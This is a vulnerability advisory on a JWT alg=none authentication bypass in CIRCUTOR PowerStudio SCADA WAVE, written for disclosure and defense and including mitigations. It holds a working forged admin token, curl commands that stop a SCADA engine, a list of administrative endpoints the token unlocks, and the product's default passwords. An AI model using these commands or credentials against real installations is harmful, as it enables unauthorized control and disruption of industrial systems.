# CIRCUTOR PowerStudio SCADA WAVE JWT alg=none Identity Forgery - Technical Analysis

## Overview

CIRCUTOR PowerStudio SCADA WAVE 24.11.6.0 is a microservice-based SCADA platform. Multiple .NET Core microservices (PSSAdministrator, PSSWidgets, PSSEvents, PSSLicense, PSSIdentity, PSSGenericDriver, PSSDataAnalytics, and others) each register JWT Bearer authentication by calling the same shared extension method `PickData.MicroservicesShared.Infrastructure.Identity.IdentityExtensions.AddJWTBearerAuthentication` inside their `Startup.ConfigureServices`. That shared method configures the JWT Bearer middleware in a fail-open manner: a custom `SignatureValidator` delegate that always returns a non-null `JsonWebToken` without ever checking the signature, `RequireSignedTokens=false`, `ValidateIssuerSigningKey=false`, `ValidateIssuer=false`, `ValidateAudience=false`, and an `OnAuthenticationFailed` handler that silently swallows any exception.

The consequence is that any attacker-crafted JWT — including an unsigned `alg=none` token with an empty signature segment — is accepted as a valid authenticated identity by every microservice. The token's `role` claim then decides which `AdminSecure` / `UserSecure` authorization policy it satisfies. Because the misconfiguration lives in one shared library, a single defect defeats authentication across the entire product.

This is an authentication-bypass / identity-forgery primitive. By itself it does not execute code; it grants unauthenticated access to every `[Authorize]`-protected microservice endpoint. It is the auth-bypass root cause of the unauthenticated `shellExecute` SYSTEM RCE chain (disclosed in a separate advisory) and is independently exploitable against any protected administrative interface.

## Architecture

```
L1 external access: 8105 (PSSWidgets, IIS, all interfaces) / 8091 (PSSReverseProxy gateway, all interfaces) / 8089 (PSSAdministrator, HTTPS, default loopback) / 8101 (PSSEvents) / other microservice ports
L2 boundary: TLS (PSSAdministrator 8089 HTTPS) / plain HTTP (PSSWidgets 8105)
L3 gateway: PSSReverseProxy :8091 — routes to microservices
L4 auth: shared JWT Bearer (AddJWTBearerAuthentication) — AdminSecure/UserSecure policies per microservice
L5 business: per-microservice controllers (EnginesController, WidgetsStorageController, CommunicationSettingsController, AdminController, etc.)
```

**Microservice layout**:

| Microservice | Port | Deployment | Account | Key controllers |
|--------------|------|------------|---------|-----------------|
| PSSAdministrator | 8089 (HTTPS) | standalone .exe | NT AUTHORITY\SYSTEM | EnginesController (engine stop/start), AdminController (microservice stop/start + config push), ForwardProxyController, RabbitMQController |
| PSSWidgets | 8105 / gateway 8091 | IIS in-process | PSSWidgetsAppPool (ApplicationPoolIdentity) | WidgetsStorageController (file upload/download/delete/listdir) |
| PSSEvents | 8101 | standalone .exe | service account | CommunicationSettingsController (Telegram/Mail test), EventsController |
| PSSLicense / PSSIdentity / PSSGenericDriver / PSSDataAnalytics | various ports | standalone / IIS | service accounts | per-microservice business controllers |

All microservices call the same shared `AddJWTBearerAuthentication` extension in `Startup.ConfigureServices` — one misconfiguration defeats authentication across the entire product.

## Stage 1: Sink Identification (Fail-Open Configuration Point)

### 1.1 Shared authentication library (reverse-engineered)

`PickData.MicroservicesShared.Infrastructure.Identity.IdentityExtensions.AddJWTBearerAuthentication`:

```csharp
public static void AddJWTBearerAuthentication(this IServiceCollection services, string authorityServer, bool requireHttps)
{
    services.AddAuthentication("Bearer").AddJwtBearer("Bearer", delegate(JwtBearerOptions options)
    {
        options.Authority = authorityServer;
        options.RequireHttpsMetadata = requireHttps;
        options.TokenValidationParameters = new TokenValidationParameters
        {
            ValidateIssuer = false,                              // no issuer validation
            ValidateAudience = false,                            // no audience validation
            ValidateIssuerSigningKey = false,                    // no signing-key validation
            ClockSkew = TimeSpan.FromMinutes(5.0),
            NameClaimType = "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name",
            RoleClaimType = "http://schemas.microsoft.com/ws/2008/06/identity/claims/role",
            SignatureValidator = (string token, TokenValidationParameters parameters) =>
                new JsonWebToken(token),                         // custom validator: returns => accepted, no signature check
            RequireSignedTokens = false                          // accepts unsigned tokens (alg=none)
        };
        options.Events = new JwtBearerEvents
        {
            OnAuthenticationFailed = context =>
            {
                // only Console.WriteLine, no re-throw, returns Task.CompletedTask
                // authentication failures are silently swallowed, not propagated as hard failures
                return Task.CompletedTask;
            }
            // OnTokenValidated / OnForbidden / OnChallenge likewise only log
        };
    });
}
```

### 1.2 Key defect points

| Setting | Defect value | Nature |
|---------|--------------|--------|
| `ValidateIssuerSigningKey` | `false` | framework does not parse/validate the issuer signing key |
| `RequireSignedTokens` | `false` | allows unsigned tokens (`alg=none`) |
| `SignatureValidator` | `(token, params) => new JsonWebToken(token)` | **custom validator replaces built-in signature check** — returning a non-null `JsonWebToken` without throwing is treated as pass |
| `ValidateIssuer` | `false` | no issuer binding |
| `ValidateAudience` | `false` | no audience binding |
| `OnAuthenticationFailed` | swallows exceptions (log only) | authentication failures silently swallowed |

## Stage 2: Source Identification (Attacker-Controlled Input)

### 2.1 Authorization header

Every microservice's HTTP entry point accepts `Authorization: Bearer <token>`. The token content is fully attacker-controlled — there is no issuer constraint (`ValidateIssuer=false`), no audience constraint (`ValidateAudience=false`), and no signature validation.

### 2.2 role claim

The JWT payload's `role` claim is filled arbitrarily by the attacker when forging the token. `RoleClaimType` is configured as `http://schemas.microsoft.com/ws/2008/06/identity/claims/role`, but ASP.NET Core's `ClaimsPrincipal.IsInRole()` also accepts the `role` short name (empirically, `role=Admin` passes PSSAdministrator's `AdminSecure` policy).

## Stage 3: Data Flow (Why Fail-Open)

### 3.1 SignatureValidator is the last-word validator

ASP.NET Core JwtBearer's token validation flow: parse token → validate issuer (`ValidateIssuer`) → validate audience (`ValidateAudience`) → validate lifetime (exp/nbf) → **validate signature**. When a custom `SignatureValidator` delegate is set, it **replaces** the built-in signature validation — the delegate returning a non-null `SecurityToken` is treated as signature pass, and not throwing means acceptance. The delegate here `(token, parameters) => new JsonWebToken(token)` **always returns a non-null `JsonWebToken` and never throws**, so signature validation is fully short-circuited, independent of signature content, key, or algorithm.

### 3.2 RequireSignedTokens=false allows alg=none

Even setting aside the `SignatureValidator`, `RequireSignedTokens=false` allows `alg=none` (empty signature segment) tokens to pass. The attacker's forged token:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJyb2xlIjoiQWRtaW4iLCJleHAiOjk5OTk5OTk5OTl9.
```

- header: `{"typ":"JWT","alg":"none"}` (base64url `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0`)
- payload: `{"role":"Admin","exp":9999999999}` (base64url `eyJyb2xlIjoiQWRtaW4iLCJleHAiOjk5OTk5OTk5OTl9`)
- signature segment: empty (`alg=none`, third segment is the empty string)

### 3.3 OnAuthenticationFailed swallows exceptions

Even if some downstream path throws a `SecurityTokenException`, the `OnAuthenticationFailed` event delegate only does `Console.WriteLine` + `return Task.CompletedTask` — no re-throw, no fail-the-request. This eliminates any accidental hard failure that could otherwise reject a forged token.

### 3.4 Net effect

Any attacker-crafted JWT (regardless of signature / algorithm / issuer / audience) is accepted as an authenticated identity, and its `role` claim decides which microservice's `AdminSecure` / `UserSecure` policy it satisfies.

## Stage 4: Injection / Exploit Construction

### 4.1 Forge alg=none JWT (role=Admin)

F1 token (used against PSSAdministrator 8089, role=Admin):

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJyb2xlIjoiQWRtaW4iLCJleHAiOjk5OTk5OTk5OTl9.
```

### 4.2 Forge arbitrary role claims

Each microservice's `AdminSecure` policy requires `Admin.<MicroserviceName>`. The attacker only needs to put the matching role into the forged JWT payload:

| Target microservice | Required role claim |
|---------------------|---------------------|
| PSSAdministrator | `Admin` (empirically passes) or `Admin.PSSAdministratorManagement` |
| PSSWidgets | `Admin.PSSWidgetsManagement` |
| PSSEvents | `Admin.PSSEventsManagement` |
| PSSLicense | `Admin.PSSLicenseManagement` |
| ... | `Admin.<MicroserviceName>` |

Constructing a JWT with any role only requires base64url-encoding the corresponding payload — no key of any kind is needed.

### 4.3 Call protected endpoints

Carrying the forged JWT in `Authorization: Bearer <token>`, the attacker can call every `AdminSecure` / `UserSecure` endpoint of the corresponding microservice:
- PSSAdministrator: `PUT /api/engines/v1/{uuid}/stop|start` (engine restart), `PUT /api/admin/v1/microservices/{name}/stop|start` (microservice stop/start), config push
- PSSWidgets: `POST /api/storage/v1` (file upload / path-traversal write)
- PSSEvents: `PUT /api/communicationsettings/v1/telegramservers/test` (Telegram SSRF precondition), mail server configuration
- PSSLicense: license management
- and others

## Stage 5: Dynamic Verification

### 5.1 PSSAdministrator 8089 — engine stop (AdminSecure)

```bash
# No Authorization header:
curl -k -X PUT "https://127.0.0.1:8089/api/engines/v1/0B28DDCA-290D-4F53-A755-57C02A56DF93/stop"
# -> 401 Unauthorized

# Forged alg=none JWT (role=Admin):
curl -k -X PUT "https://127.0.0.1:8089/api/engines/v1/0B28DDCA-290D-4F53-A755-57C02A56DF93/stop" \
  -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJyb2xlIjoiQWRtaW4iLCJleHAiOjk5OTk5OTk5OTl9."
# -> 200 OK (engine stopped)
```

The same endpoint returns 401 without a token and 200 with the forged `alg=none` JWT — proving the forged token passes `AdminSecure` authentication. The 200 is accompanied by a real engine stop (the engine PID disappears), confirming authentication pass + authorization pass + business action execution end-to-end.

### 5.2 PSSWidgets 8105 — StorageSystem upload (AdminSecure)

A forged `role=Admin.PSSWidgets` JWT against `POST /api/storage/v1` Upload successfully writes a file into the PSSWidgets data directory (a component of the separate RCE chain).

### 5.3 PSSEvents 8101 — communication settings (AdminSecure)

The F1 token reaches the PSSEvents communication-settings endpoints (Telegram/Mail test), confirming the primitive is valid cross-microservice.

## Stage 6: Reachability

### 6.1 Network precondition

The exploit precondition for this primitive (authentication bypass) is that the attacker can reach the target microservice's HTTP/HTTPS port:
- PSSAdministrator 8089 (HTTPS, default loopback `127.0.0.1`)
- PSSWidgets 8105 / gateway 8091 (HTTPS, bound to all interfaces)
- PSSEvents 8101
- and others

Port reachability varies per deployment (loopback / all interfaces / reverse-proxy forwarding). **Once a port is reachable, this primitive bypasses that microservice's entire `AdminSecure` / `UserSecure` authentication.**

### 6.2 Role in the RCE chain

The full unauthenticated SYSTEM RCE chain (separate advisory) = **this auth-bypass primitive** + path-traversal file write + HTTP engine restart + condition-gate expression bypass + `shellExecute` sink. This primitive is the root cause of the "bypass AdminSecure authentication" step — without it, both 8089's `PUT /engines/stop|start` and 8105's `POST /storage` would return 401 and the chain would break.

### 6.3 Standalone exploitability

This primitive does not directly execute code, but it constitutes an authentication-bypass sufficient for independent disclosure as an authentication-system-level vulnerability. An attacker can use it to:
- Unauthenticated stop/start of any microservice or the engine (DoS / control-plane takeover)
- Unauthenticated configuration push (alter SCADA behavior)
- Unauthenticated file upload/download/delete (authentication precondition for the path-traversal write)
- Unauthenticated external-communication configuration (authentication precondition for Telegram/Mail SSRF)
- Unauthenticated license management

## Stage 7: Defense in Depth / Mitigation

1. **Remove the custom `SignatureValidator`** and restore ASP.NET Core built-in signature validation.
2. `ValidateIssuerSigningKey=true`, `RequireSignedTokens=true`.
3. `ValidateIssuer=true`, `ValidateAudience=true`, bound to the PSSIdentity OpenIddict issuer.
4. `OnAuthenticationFailed` should re-throw or fail the request, not silently swallow.
5. Short-term mitigation: enforce `alg != none` and non-empty signature at the reverse-proxy layer (PSSReverseProxy).
6. Remove the hardcoded default credentials (`admin` / `admin1234`, `user` / `user1234`); force a password change on first install.

## Reproduction Commands

```bash
# Forge an alg=none JWT (role=Admin) and hit the PSSAdministrator 8089 stop endpoint
# (class-level [Authorize(Policy="AdminSecure")], requires role=Admin):
curl -k -X PUT "https://<target>:8089/api/engines/v1/0B28DDCA-290D-4F53-A755-57C02A56DF93/stop" \
  -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJyb2xlIjoiQWRtaW4iLCJleHAiOjk5OTk5OTk5OTl9."
# Expected: 200 OK (engine stopped) — proving the forged JWT passes AdminSecure

# Contrast: no Authorization header -> 401 Unauthorized
curl -k -X PUT "https://<target>:8089/api/engines/v1/0B28DDCA-290D-4F53-A755-57C02A56DF93/stop"
# Expected: 401 Unauthorized
```

The full automation script is at `exploit/circutor_powerstudio_jwt_alg_none_forgery.py` (Python standard library only — forges an `alg=none` JWT and verifies the authentication bypass by comparing the no-token 401 vs forged-token 200 response).

## Key Technical Insights

1. **Shared authentication trust root**: one fail-open `AddJWTBearerAuthentication` configuration is referenced by every microservice — a single `alg=none` forged JWT defeats `AdminSecure` / `UserSecure` across the entire product. This is the auth-bypass primitive that makes every protected microservice endpoint unauthenticated.

2. **Custom `SignatureValidator` is the root cause**: setting a custom `SignatureValidator` delegate **replaces** the ASP.NET Core built-in signature validation. A delegate that always returns a non-null `JsonWebToken` and never throws short-circuits signature validation entirely — independent of signature content, key, or algorithm. This is a subtler and more dangerous pattern than simply disabling `ValidateIssuerSigningKey`: it looks like validation is configured (a validator is present) but no validation actually occurs.

3. **`RequireSignedTokens=false` is the enabler for `alg=none`**: even if the custom `SignatureValidator` were removed, `RequireSignedTokens=false` would still allow unsigned tokens. Both must be fixed.

4. **Silent exception swallowing removes the safety net**: `OnAuthenticationFailed` returning `Task.CompletedTask` without re-throwing means any `SecurityTokenException` raised downstream is logged and ignored rather than failing the request. A fail-open design has no business being lenient on authentication errors — authentication failures must be hard failures.

5. **Honest scope**: this is an authentication-bypass / identity-forgery primitive, not a direct RCE. Its CVSS reflects unauthorized information disclosure, integrity violation (config/engine/file manipulation), and availability impact across multiple microservice trust domains — not full SYSTEM code execution, which requires chaining with additional primitives disclosed separately.

## Credits

Discovered by 0day Rubbish Project using automated AI vulnerability research with multi-LLM ensemble (Claude, OpenAI, DeepSeek, GLM).

---

*Disclaimer: This research was conducted for defensive purposes. Always obtain proper authorization before testing systems you don't own. Responsible disclosure practices apply.*
